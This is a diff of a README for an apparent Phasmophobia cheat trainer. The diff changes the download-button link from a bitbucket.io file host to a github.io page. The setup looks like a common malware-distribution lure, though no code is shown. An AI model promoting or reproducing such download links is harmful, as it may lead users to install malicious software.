@@ -6,7 +6,7 @@
 
 This tool is your ghost-hunting command center: **god mode**, **infinite sanity**, **item unlocker**, **ghost type reveal**, **speed hacks**, and more—all in one simple interface.
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload8.bitbucket.io)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://Phasmophobia-Trainer-giva3.github.io/.github)
 ---
 
 ## 💻 Product Overview
